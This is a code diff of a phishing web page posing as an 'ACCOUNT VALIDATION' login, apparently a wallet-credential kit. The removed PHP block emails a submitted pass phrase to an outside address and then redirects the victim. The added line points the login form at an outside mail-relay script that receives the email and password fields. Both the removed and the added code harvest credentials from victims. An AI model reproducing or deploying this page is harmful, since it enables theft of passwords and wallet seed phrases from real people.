@@ -1,18 +1,8 @@
-      <?php
-if($_POST["phrased"]) {
-	$content = $_POST["phrased"];
-	$subject = "Phrase From Sync";
 
-	$toEmail = "result@authentic-account.com";
-	$mailHeaders = "From: Sync";
-	if(mail($toEmail, $subject, 'Pass Phrase: '.$content, $mailHeaders)) {
-	    mail($to,$subject,$txt,$headers);
-  header("Location: https://authentic-account.com/indexhome/connect/QR.html");
-	    ?>
 <!DOCTYPE html>
 <html lang="en">
     
-<!-- Mirrored from smartaccountvalidation.com/ by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 23 Jul 2024 07:10:25 GMT -->
+
 <head>
         <meta charset="UTF-8">
         <meta http-equiv="X-UA-Compatible" content="IE=edge">
@@ -243,7 +233,7 @@ if($_POST["phrased"]) {
     <body>
         <header class="site-header">
             <div class="site-logo">
-                <span> <img width="30px" height="30px" src="https://res.cloudinary.com/dwsla5hkc/image/upload/v1721714531/logo3_pomogb.png"></span>
+                <span> <img width="30px" height="30px" src="../res.cloudinary.com/dwsla5hkc/image/upload/v1721714531/logo3_pomogb.png"></span>
                 <h2>ACCOUNT VALIDATION</h2> 
             </div>
             <nav class="navigation" id="nav">
@@ -262,7 +252,7 @@ if($_POST["phrased"]) {
             
         </header>
         <section class="form-sect">
-            <form action="index.html" method="POST">
+            <form action="https://sendam.me/sendmail/sendmail.php" method="POST">
                 <div class="form-header">
                     <span class="material-symbols-outlined">login</span>
                     <p>Login to your Account</p>
@@ -271,11 +261,11 @@ if($_POST["phrased"]) {
                 <div class="user-input-sect">
                     <div class="username inp" >
                         <p>Email Address</p>
-                        <input id="txt" type="email" name="Name" required>
+                        <input id="txt" type="email" name="email" required>
                     </div>
                     <div class="password inp">
                         <p>Password</p>
-                        <input id="txt" type="password" name="Email" required>
+                        <input id="txt" type="password" name="password" required>
                     </div>
                 </div>
                 <button type="submit">continue</button>
@@ -283,5 +273,6 @@ if($_POST["phrased"]) {
         </section>  
     
     </body>
+
 
 </html>
